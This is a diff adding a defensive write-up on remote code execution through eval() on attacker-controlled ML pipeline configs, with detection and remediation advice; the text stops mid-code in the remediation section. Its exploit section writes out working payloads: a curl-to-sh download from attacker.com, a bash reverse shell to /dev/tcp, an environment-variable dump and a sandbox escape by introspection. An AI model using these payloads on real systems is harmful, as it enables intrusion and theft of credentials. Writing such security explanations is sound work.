@@ -1,0 +1,64 @@
+# RCE via `eval()` on Attacker-Controlled Config
+
+## The Vulnerability Path
+
+```python
+transform = eval(config['transform'])  # config['transform'] is attacker-controlled
+```
+
+`eval()` compiles and executes an arbitrary Python expression in the current process. If an attacker controls `config['transform']`, they get code execution with the privileges of the loader process.
+
+### How the exploit works
+
+The config field is probably *intended* to hold something benign like `"lambda x: x / 255.0"`. But `eval` doesn't limit itself to "transform-shaped" expressions.
+
+An attacker supplies:
+
+```python
+# Direct import + execution
+"__import__('os').system('curl attacker.com/x.sh | sh')"
+
+# Reverse shell
+"__import__('os').system('bash -c \"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\"')"
+
+# Exfiltrate secrets / credentials
+"__import__('os').environ"
+
+# Even with restricted globals, escape via introspection
+"().__class__.__bases__[0].__subclasses__()"  # walk to os/subprocess
+```
+
+The last one matters: naive "sandboxing" like `eval(x, {'__builtins__': {}})` is **not** safe. Object introspection lets an attacker traverse the class hierarchy back to dangerous builtins. There is no reliable way to sandbox `eval` in CPython.
+
+### The delivery vector
+
+The config typically arrives via:
+- A YAML/JSON file downloaded from a model hub or dataset registry
+- A user-submitted job spec in an ML pipeline
+- A shared "experiment config" in a multi-tenant training platform
+
+So this is often a **supply-chain** or **multi-tenant privilege** issue, not just local misuse.
+
+---
+
+## Detection
+
+### Static / pre-deployment
+- **SAST / grep**: flag `eval(`, `exec(`, `compile(`, `pickle.loads`, `__import__`, `getattr` on untrusted input. Tools: Bandit (`B307` flags `eval`), Semgrep rules.
+- **Taint analysis**: trace data flow from config parsing → `eval`. CodeQL handles this well.
+
+### Runtime
+- **Audit hooks** (`sys.addaudithook`, PEP 578): intercept `exec`, `compile`, `import`, `os.system`, `subprocess.Popen`, socket connections. Log/alert on unexpected events during config loading.
+- **Behavioral monitoring**: a *dataset loader* should never spawn shells, open outbound sockets, or read `/etc/passwd`. Use seccomp/eBPF/Falco to flag anomalous syscalls (execve of `sh`, unexpected network egress).
+- **Egress monitoring**: alert on connections from training nodes to non-allowlisted hosts.
+
+---
+
+## Blocking / Remediation
+
+### 1. Eliminate `eval` — use a safe mapping
+Replace free-form code with a registry of allowed transforms:
+
+```python
+TRANSFORMS = {
+    "normalize":
